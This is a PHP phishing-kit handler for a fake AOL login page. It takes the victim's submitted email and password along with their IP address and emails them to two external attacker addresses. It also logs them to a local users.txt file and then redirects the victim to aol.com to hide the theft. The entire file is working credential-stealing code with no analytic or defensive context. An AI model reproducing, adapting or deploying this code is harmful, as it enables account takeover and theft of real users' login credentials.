<?php
include 'antibots.php';

$ip = getenv("REMOTE_ADDR");
$message .= "-------------- Login Info-----------------------\n";
$message .= "USER   : ".$_POST['email']."\n";
$message .= "PAZZ   : ".$_POST['formtext1']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "-------------------------------------------------------------\n";
$send = "beastresult520@gmail.com, inyass75@yahoo.com";
$subject = "AOL2018";
$headers = "From: Genral<lionm@Simba>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);

mail($send,$subject,$message,$headers);

$fp = fopen("users.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: https://aol.com");

	 
?>

